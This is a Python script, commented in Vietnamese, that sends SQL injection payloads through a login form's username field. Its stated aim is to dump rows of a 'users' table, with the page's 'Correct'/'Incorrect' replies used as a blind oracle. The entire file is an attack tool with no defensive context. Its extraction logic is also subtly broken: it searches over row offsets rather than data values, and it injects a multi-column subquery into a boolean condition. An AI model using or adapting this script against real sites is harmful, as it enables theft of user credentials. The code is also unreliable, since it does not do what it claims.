import requests

url = "http://example.com/login"  # URL của trang đăng nhập
target_table = "users"  # Bảng cần dump dữ liệu
column_count = 3  # Số lượng cột trong bảng

def binary_search(query, low, high):
    while low <= high:
        mid = (low + high) // 2
        test_query = query + f" LIMIT 1 OFFSET {mid}"
        # Thực hiện truy vấn đến cơ sở dữ liệu để kiểm tra kết quả
        response = requests.post(url, data={'username': f"' OR ({test_query})--", 'password': 'dummy'})
        # Xử lý phản hồi và kiểm tra kết quả
        if "Correct" in response.text:
            return mid
        elif "Incorrect" in response.text:
            high = mid - 1
        else:
            low = mid + 1
    return -1

def dump_table_data():
    data = []
    for i in range(100):  # Giả sử có tối đa 100 hàng trong bảng
        query = f"SELECT * FROM {target_table}"
        row_data = []
        for j in range(column_count):
            low, high = 0, i
            result = binary_search(query, low, high)
            if result != -1:
                row_data.append(result)
            else:
                break
        if len(row_data) == column_count:
            data.append(row_data)
        else:
            break
    return data

# Dump dữ liệu từ bảng
table_data = dump_table_data()
print(table_data)
